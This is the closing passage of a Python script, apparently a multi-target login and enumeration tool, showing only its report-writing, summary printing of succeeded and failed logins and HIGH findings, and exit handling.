        write_report(output_path, results, args, len(targets), interrupted)
    except OSError as e:
        sys.exit(f"\n[!] Could not write report to {output_path}: {e}")

    succeeded = [r for r in results if r["success"]]
    failed = [r for r in results if not r["success"]]
    high_total = sum(_high_count(r) for r in succeeded)

    print(f"\n{C.CYAN}Summary:{C.RESET} "
          f"{C.GREEN}{len(succeeded)} succeeded{C.RESET}, "
          f"{C.RED}{len(failed)} failed{C.RESET} "
          f"out of {len(targets)} targets"
          f"{' (interrupted)' if interrupted else ''}.")
    if args.enum or args.privesc:
        print(f"{C.YELLOW}{high_total} HIGH finding(s){C.RESET} across successful logins.")
    print(f"Full report written to: {C.BOLD}{output_path}{C.RESET}")

    return 130 if interrupted else 0


if __name__ == "__main__":
    sys.exit(main())
